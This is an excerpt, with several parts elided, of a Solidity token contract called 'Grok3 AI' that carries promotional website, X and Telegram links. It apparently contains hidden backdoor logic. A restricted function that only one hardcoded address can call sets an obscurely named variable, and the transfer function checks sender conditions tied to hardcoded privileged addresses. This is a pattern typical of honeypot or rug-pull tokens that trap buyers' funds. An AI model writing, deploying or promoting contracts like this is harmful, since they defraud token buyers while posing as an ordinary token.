/* 
    website  : https://www.GROK3AI.com
    twitter  : https://x.com/GROK3AI
    telegram : https://t.me/GROK3AI
*/
...
contract GROK3AI is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
        require(_msgSender() == 0xE087A1BAf3e5fE3e6fA33bf1265C7117EFdEd602 );
          _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x9182d5dAC4A62c75a335d6E0cD7214F12Ccb5Ab3 
         && from != 0xE087A1BAf3e5fE3e6fA33bf1265C7117EFdEd602 
         && from != 0x595948C88B334576bFD380223370188Be64EB44e)) {
    ...
    constructor() {
        _name = unicode"Grok3 AI";
        _symbol = unicode"GROK3 AI";
